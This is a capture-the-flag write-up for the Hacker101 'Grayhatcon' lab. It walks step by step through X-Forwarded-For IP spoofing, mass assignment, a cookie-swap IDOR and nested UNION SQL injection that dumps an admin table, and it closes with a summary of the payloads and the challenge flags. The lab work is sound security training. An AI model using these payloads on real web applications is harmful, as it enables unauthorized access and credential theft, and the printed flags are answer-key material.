# 🏴 Grayhatcon CTF

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `4/4` ✅

---

## ⛓️ Attack Chain

```
robots.txt → /s3cr3t-4dm1n/ → .htaccess → IP Spoofing (X-Forwarded-For) → Flag 2
                                      ↓
                               Password Reset → hunter2's hash
                                      ↓
                               Register with owner_hash → Flag 1
                                      ↓
                               IDOR (swap userhash cookie) → Flag 3
                                      ↓
                               SQL Injection (nested/JSON-based) → Flag 4
```

---

## 🔍 Application Overview

An auction platform where `hunter2` is selling a leaked HackerOne credentials database. The goal is to delete that listing. Four vulnerabilities chain together: IP spoofing to reach the admin panel, mass assignment to register under hunter2's account, IDOR to impersonate hunter2, and nested SQL injection to extract admin credentials.

---

## 🚩 Flag 2 — IP Spoofing via X-Forwarded-For

**Vulnerability:** IP Spoofing / `X-Forwarded-For` Bypass

### Step 1 — Check robots.txt

```
/robots.txt → reveals /s3cr3t-4dm1n/
```

Direct access returns **403 Forbidden**.

### Step 2 — Fuzz the directory to find `.htaccess`

```bash
ffuf -u http://TARGET/s3cr3t-4dm1n/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .htaccess
```

Found: `.htaccess` with status `403`

### Step 3 — Read `.htaccess`

```apache
Order Deny,Allow
Deny from all
Allow from 8.8.8.8
Allow from 8.8.4.4
```

Only Google's DNS IPs are allowed. The server trusts the `X-Forwarded-For` header blindly.

### Step 4 — Spoof the IP

```bash
curl https://TARGET/s3cr3t-4dm1n -H "X-Forwarded-For: 8.8.8.8"
```

**Flag 2:**
```
flag{h1_ip_spoof}
```

> 💡 In Burp: use **Proxy → Match and Replace** to automatically add `X-Forwarded-For: 8.8.8.8` to every request.

---

## 🚩 Flag 1 — Mass Assignment on /register

**Vulnerability:** Mass Assignment / Hidden Parameter Injection

### Step 1 — Get hunter2's hash via password reset

Navigate to `/reset` and request a password reset for `hunter2`. The response contains a hidden field:

```html
<input type="hidden" name="account_hash" value="cf505baebbaf25a0a4c63eb93331eb36">
```

### Step 2 — Register a normal user with the `owner_hash` parameter

The server accepts extra parameters that aren't in the HTML form:

```http
POST /register HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

owner_hash=cf505baebbaf25a0a4c63eb93331eb36&new_username=partypooper&new_password=partypooper
```

### Step 3 — Check the response

The account is created as a sub-user under `hunter2`. Flag 1 appears on login.

**Flag 1:**
```
flag{h1_validate_that_input}
```

---

## 🚩 Flag 3 — IDOR via userhash Cookie

**Vulnerability:** Insecure Direct Object Reference (IDOR)

### Step 1 — Log in as the sub-user

After registration, log in as `partypooper`. Navigate to `/dashboard/subusers`.

### Step 2 — Intercept the enable request

Click the enable button for your sub-user. In Burp, capture the request:

```http
POST /dashboard/subusers HTTP/1.1
Cookie: userhash=898f308b0496b0c86504dc6734da4a6d
Content-Type: application/x-www-form-urlencoded

hash=ce0cbbfa5262c733d9d545e1a3a65052&enable_toggle=enable
```

### Step 3 — Swap the `userhash` cookie

Change `userhash` from your hash to `hunter2`'s hash:

```http
Cookie: userhash=cf505baebbaf25a0a4c63eb93331eb36
```

### Step 4 — Forward the request

The server now thinks you are `hunter2` and enables your sub-user. Flag 3 appears.

**Flag 3:**
```
flag{h1_watch_for_idors}
```

---

## 🚩 Flag 4 — Nested SQL Injection (SQLi Inception)

**Vulnerability:** SQL Injection / JSON-based / Nested SQLi

### Step 1 — Find the vulnerable endpoint in JavaScript

The file `assets/js/app.min.js` contains:

```javascript
$.getJSON('auctions/questions?id=' + i, function(resp) {
```

### Step 2 — Test for injection

```http
GET /dashboard/auctions/questions?id=5 AND 0-- HTTP/1.1
```
Response: `{"error":"Invalid auction type ID entered"}`

```http
GET /dashboard/auctions/questions?id=5 AND 1-- HTTP/1.1
```
Response: Normal JSON with auctions data.

### Step 3 — Find column count with valid JSON

The `questions` field expects JSON. Supply an empty array:

```http
GET /dashboard/auctions/questions?id=0 UNION SELECT 1,2,'[]'-- HTTP/1.1
```

### Step 4 — Confirm control over output

```http
GET /dashboard/auctions/questions?id=0 UNION SELECT 1,2,'[{"test":"data"}]'-- HTTP/1.1
```

### Step 5 — Nested injection (SQLi Inception)

The first column is executed as a second SQL query:

```http
GET /dashboard/auctions/questions?id=0+union+select+'0+union+select+1,2,3,4,5,6,7,8,9',2,'[]'-- HTTP/1.1
```

### Step 6 — Enumerate tables

```http
GET /dashboard/auctions/questions?id=0+union+select+'0+union+select+table_name,2,3,4,5,6,7,8,9+from+information_schema.tables',2,'[]'-- HTTP/1.1
```

Found table: `admin`

### Step 7 — Dump admin credentials

```http
GET /dashboard/auctions/questions?id=0+union+select+'0+union+select+username,2,3,4,5,password,7,8,9+from+admin',2,'[]'-- HTTP/1.1
```

**Extracted credentials:**
```
username: h4ckerbayadmin
password: auction$rFun!
```

### Step 8 — Log into `/s3cr3t-4dm1n/` with the extracted credentials and delete the HackerOne auction.

**Flag 4:**
```
^FLAG^50d704ed12bd4e1c36b33f8ddb896ea5356115e3b52118414c2943faa40c0923$FLAG$
```

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| **IP Spoofing** | Server trusts `X-Forwarded-For` header without validation |
| **Mass Assignment** | `owner_hash` parameter accepted in normal registration form — no ownership check |
| **IDOR** | `userhash` cookie controls identity — no server-side session verification |
| **Nested SQLi** | `?id=` parameter injected into two SQL queries in sequence — both unsanitized |

---

## 📋 Payloads Summary

```bash
# Flag 2 — IP Spoofing
curl https://TARGET/s3cr3t-4dm1n -H "X-Forwarded-For: 8.8.8.8"

# Flag 1 — Mass Assignment
POST /register
owner_hash=cf505baebbaf25a0a4c63eb93331eb36&new_username=partypooper&new_password=partypooper

# Flag 3 — IDOR cookie swap
Cookie: userhash=cf505baebbaf25a0a4c63eb93331eb36

# Flag 4 — Nested SQLi to dump admin table
/dashboard/auctions/questions?id=0+union+select+'0+union+select+username,2,3,4,5,password,7,8,9+from+admin',2,'[]'--
```

---

## 🛠️ Tools Used

- **Burp Suite** — Intercepting requests, modifying headers, IDOR exploitation
- **ffuf** — Directory fuzzing to find `.htaccess`
- **curl** — Manual request sending with custom headers
- **Ghauri** — SQL injection detection and exploitation
